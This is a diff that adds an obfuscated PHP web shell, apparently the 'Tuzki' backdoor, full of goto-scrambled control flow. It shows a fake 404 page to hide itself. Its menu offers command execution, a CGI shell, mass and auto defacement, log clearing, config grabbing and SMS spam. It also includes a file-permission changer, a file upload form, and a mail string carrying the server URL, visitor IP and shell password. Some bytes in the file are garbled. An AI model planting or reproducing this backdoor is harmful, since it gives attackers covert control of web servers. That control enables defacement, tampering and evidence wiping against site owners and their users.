@@ -1,0 +1,370 @@
+ L1ZR1(); goto GJDO7; ctUzc: HNMnj(); goto ThQCb; YeyTs: $shell_path = $content_mail = "URL : http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] . "
+
+IP : " . $_SERVER["REMOTE_ADDR"] . "
+
+Password : " . $auth_pass . "
+\xaBy Cvar1Ä"; goto Sp_ot; bn54s: function K3j3z()
+ {
+     goto wzIkj;
+     gTkcD: exit;
+     goto soEyj;
+     rOmAV: echo $_SERVER["PHP_SELF"];
+     goto N4JS1;
+     N4JS1: ?> was not found on this server.</p>
+<p>Additionally, a 404 Not Found
+error was encountered while trying to use an ErrorDocument to handle the request.</p>
+<?php  goto gTkcD;
+     wzIkj: ?>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL <?php  goto rOmAV;
+     soEyj:
+ } goto JfUXZ; JdLdN: OExGh: goto vQ3dI; FZCUK: goto Jkk29; goto Hz6Gx; d_edT: YccVm(); goto lALpc; KXAl7: function UEqDa($filename)
+ {
+     goto QDMVj;
+     RbMM9: nizoE: goto wi1jx;
+     j48C1: die;
+     goto unN1f;
+     jD5Mo: goto nizoE;
+     goto UCRmK;
+     UCRmK: d3Rpm: goto ni7xo;
+     Q0ZX0: U0rbo: goto LSHZo;
+     wi1jx: tnBRL();
+     goto Q0ZX0;
+     LSHZo: ?>
+   <form method='post'>
+		<center>
+			<td>Permission : <input type='text' class='input-sm' id='input'
+				value='0755' name='permission'></td> <input type='submit'
+				class='btn btn-danger' name='action' value='chmod'>
+		</center>
+	</form>
+	<?php  goto j48C1;
+     zUEaS: if (chmod($filename, $_POST["permission"])) {
+         goto d3Rpm;
+     }
+     goto UZgRY;
+     ni7xo: JJixG("Success");
+     goto RbMM9;
+     UZgRY: JjiXG("Permission Denied");
+     goto jD5Mo;
+     QDMVj: if (!isset($_POST["action"])) {
+         goto U0rbo;
+     }
+     goto zUEaS;
+     unN1f:
+ } goto oUttM; Db0q_: XGeZ9: goto kN_m_; GJDO7: goto Jkk29; goto GS__n; zknN1: $os = "Linux"; goto s5SwB; DgSHm: c5S6g(); goto f8uYC; GS__n: zBGpp: goto tsNUj; m8Vl9: $dir = $_GET["dir"]; goto neAj8; tVkjr: kX6ei: goto xD83Z; q3ebb: S1ihE: goto bn54s; nENXh: Jjanc($_GET["files"]); goto YVxpL; yTS4n: function Spmg1($filename)
+ {
+     jJIxg("this extension is not supported");
+     tNBrL();
+ } goto deCzC; Eft_I: xiZFI($_GET["files"]); goto XHZO8; BV3jv: YqYC7(); goto xtMZ1; E_3T1: goto Jkk29; goto tVkjr; tZReq: header("HTTP/1.0  4 Not Found"); goto kWim3; iUmx7: qH8q8: goto DgSHm; lsPIc: if (@T9Gaw($_GET["files"])) {
+     goto IIev0;
+ } goto wdnHz; T3NUU: ?>
+<nav class="navbar navbar-inverse">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<a class="navbar-brand" href="https://github.com/BlackHoleSecurity/backdoor">Tuzki</a>
+		</div>
+		<ul class="nav navbar-nav">
+			<li class="active"><a href="?">Home</a></li>
+			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
+				<ul class="dropdown-menu">
+					<li><a href='?do=cmd'><span class="glyphicon glyphicon-list-alt"></span> Command Prompt</a></li>
+					<li><a href='?do=sms'><span class="glyphicon glyphicon-envelope"></span> Spam SMS</a></li>
+					<li><a href='?do=music'><span class="glyphicon glyphicon-headphones"></span> Music</a></li>
+					<li><a href='?do=jumping'><span class="glyphicon glyphicon-transfer"></span> Jumping</a></li>
+					<li><a href='?do=config'><span class="glyphicon glyphicon-wrench"></span> Config</a></li>
+					<li><a href='?do=mass_deface'><span class="glyphicon glyphicon-random"></span> Mass Deface</a></li>
+					<li><a href='?do=info'><span class="glyphicon glyphicon-info-sign"></span> Server Info</a></li>
+					<li><a href='?do=logs'><span class="glyphicon glyphicon-retweet"></span> Clear Logs</a></li>
+					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
+					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
+					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
+					<li><a href='?do=network'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
+				</ul>
+			</li>
+			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
+		</ul>
+	</div>
+</nav>
+<?php  goto pwCJW; OI4ds: echo date("Y"); goto QjL6a; prBdu: goto Jkk29; goto lXYhF; YRYYO: function yqYc7()
+ {
+     goto jqEUs;
+     jqEUs: echo "<center>";
+     goto T3c8A;
+     It7HB: die;
+     goto IlAPv;
+     T3c8A: echo "<iframe width='700px' height='5€px' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874É1&amp;color=#€cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
+     goto q5pHX;
+     q5pHX: echo "</center>";
+     goto It7HB;
+     IlAPv:
+ } goto XyLTN; OMq5A: goto Jkk29; goto pGXIU; zNXEM: if ($_GET["do"] == "home") {
+     goto Guyes;
+ } goto fP0qQ; Vw1Hz: if ($_GET["do"] == "music") {
+     goto pQmVw;
+ } goto OToAi; jyqm9: UIEKr(); goto g8_oj; caYUZ: function JjixG($message)
+ {
+     goto cemld;
+     ONmgf: echo "'" . $message . "'";
+     goto terM6;
+     cemld: ?>
+<script type="text/javascript">
+var ALERT_TITLE = "Alert";
+var ALERT_BUTTON_TEXT = "Ok";
+if (document.getElementById) {
+	window.alert = function(txt) {
+		createCustomAlert(txt);
+	}
+}
+
+function createCustomAlert(txt) {
+	d = document;
+	if (d.getElementById("modalContainer")) return;
+	mObj = d.getElementsByTagName("body")[0].appendChild(d.createElement("div"));
+	mObj.id = "modalContainer";
+	mObj.style.height = d.documentElement.scrollHeight + "px";
+	alertObj = mObj.appendChild(d.createElement("div"));
+	alertObj.id = "alertBox";
+	if (d.all && !window.opera) alertObj.style.top = document.documentElement.scrollTop + "px";
+	alertObj.style.left = (d.documentElement.scrollWidth - alertObj.offsetWidth) / 2 + "px";
+	alertObj.style.visiblity = "visible";
+	h1 = alertObj.appendChild(d.createElement("h1"));
+	h1.appendChild(d.createTextNode(ALERT_TITLE));
+	msg = alertObj.appendChild(d.createElement("p"));
+	//msg.appendChild(d.createTextNode(txt));
+	msg.innerHTML = txt;
+	btn = alertObj.appendChild(d.createElement("a"));
+	btn.id = "closeBtn";
+	btn.appendChild(d.createTextNode(ALERT_BUTTON_TEXT));
+	btn.href = "#";
+	btn.focus();
+	btn.onclick = function() { removeCustomAlert(); return false; }
+	alertObj.style.display = "block";
+}
+
+function removeCustomAlert() {
+	document.getElementsByTagName("body")[0].removeChild(document.getElementById("modalContainer"));
+}
+</script>
+<style type="text/css">
+#modalContainer {
+	background-color: rgba(0, 0, 0, 0.3);
+	position: absolute;
+	width: 100%;
+	height: 100%;
+	top: 0px;
+	left: 0px;
+	z-index: 10000;
+	/* required by MSIE to prevent actions on lower z-index elements */
+}
+
+#alertBox {
+	position: relative;
+	width: 300px;
+	min-height: 100px;
+	margin-top: 50px;
+	border: 1px solid #666;
+	background-color: #fff;
+	background-repeat: no-repeat;
+	background-position: 20px 30px;
+}
+
+#modalContainer>#alertBox {
+	position: fixed;
+}
+
+#alertBox h1 {
+	margin: 0;
+	font: bold 0.9em verdana, arial;
+	background-color: #3073BB;
+	color: #FFF;
+	border-bottom: 1px solid #000;
+	padding: 2px 0 2px 5px;
+}
+
+#alertBox p {
+	color: red;
+	height: 50px;
+	padding-left: 5px;
+	margin-left: 55px;
+}
+
+#alertBox #closeBtn {
+	display: block;
+	position: relative;
+	margin: 5px auto;
+	padding: 7px;
+	border: 0 none;
+	width: 70px;
+	font: 0.7em verdana, arial;
+	text-transform: uppercase;
+	text-align: center;
+	color: #FFF;
+	background-color: #357EBD;
+	border-radius: 3px;
+	text-decoration: none;
+}
+
+
+/* unrelated styles */
+
+#mContainer {
+	position: relative;
+	width: 600px;
+	margin: auto;
+	padding: 5px;
+	border-top: 2px solid #000;
+	border-bottom: 2px solid #000;
+	font: 0.7em verdana, arial;
+}
+
+h1,
+h2 {
+	margin: 0;
+	padding: 4px;
+	font: bold 1.5em verdana;
+	border-bottom: 1px solid #000;
+}
+
+code {
+	font-size: 1.2em;
+	color: #069;
+}
+
+#credits {
+	position: relative;
+	margin: 25px auto 0px auto;
+	width: 350px;
+	font: 0.7em verdana;
+	border-top: 1px solid #000;
+	border-bottom: 1px solid #000;
+	height: 90px;
+	padding-top: 4px;
+}
+
+#credits img {
+	float: left;
+	margin: 5px 10px 5px 0px;
+	border: 1px solid #000000;
+	width: 80px;
+	height: 79px;
+}
+
+.important {
+	background-color: #F5FCC8;
+	padding: 2px;
+}
+
+.main {
+	width: 100%;
+	box-shadow: inset 0 -1px 0 rgba(48, 48, 48, 0.7), 0 2px 4px rgba(48, 48, 48, 0.7);
+}
+
+.vn-nav ul {
+	margin: 0;
+	padding: 0;
+	list-style-type: none;
+	list-style-image: none;
+}
+
+.vn-nav li {
+	margin-right: 0px;
+	display: inline;
+}
+
+.vn-nav ul li a {
+	text-decoration: none;
+	margin: 0px;
+	padding: 15px 20px 15px 20px;
+	color: #ffffff;
+}
+
+.vn-nav li.current-menu-item a {
+	color: #fff;
+	text-decoration: none;
+	background-color: #16a085;
+}
+
+.vn-nav li.current_page_item {
+	color: #fff;
+	text-decoration: none;
+	background-color: #16a085;
+}
+
+.modalDialog {
+	position: fixed;
+	font-weight: bold;
+	font-family: 'Agency FB';
+	top: 0;
+	right: 0;
+	bottom: 0;
+	left: 0;
+	background: rgba(0, 0, 0, 0.8);
+	z-index: 99999;
+	opacity: 0;
+	-webkit-transition: opacity 400ms ease-in;
+	-moz-transition: opacity 400ms ease-in;
+	transition: opacity 400ms ease-in;
+	pointer-events: none;
+}
+
+.modalDialog:target {
+	opacity: 1;
+	pointer-events: auto;
+}
+
+.modalDialog>div {
+	width: 500px;
+	height: auto;
+	position: relative;
+	margin: 5% auto;
+	padding: 5px 20px 13px 20px;
+	background: #34495e;
+	color: #fff;
+}
+
+.close {
+	background: #2c3e50;
+	color: #16a085;
+	padding: 5px;
+	position: right;
+	right: -55px;
+	text-align: center;
+	top: 0;
+	width: auto;
+	float: left;
+	text-decoration: none;
+	font-weight: bold;
+}
+
+.close:hover {
+	background: #2c3e50;
+	color: #e74c3c
+}
+
+.vn-green a {
+	background: #27ae60;
+	padding: 10px;
+	color: #fff;
+}
+
+.vn-green a:hover {
+	color: red;
+	background: #21894d;
+	text-decoration: none;
+}
+</style>
+<script type="text/javascript">alert(<?php  goto ONmgf;
+     terM6: ?>);</script>
+<?php  goto lgIu4;
+     lgIu4:
+ } goto acC90; qkhAz: CJNkO: goto nYmSZ; bM1qs: Guyes: goto Dn0ba; Y4e5u: ?>
+	<form method="post" enctype="multipart/form-data">
+		<center>
+			<input class="btn" type="file" name="file" />
+			<input class="btn btn-danger" name="upl" type="submit" value="Save">
+		</center>
+	</form>
+</body>
+</html>
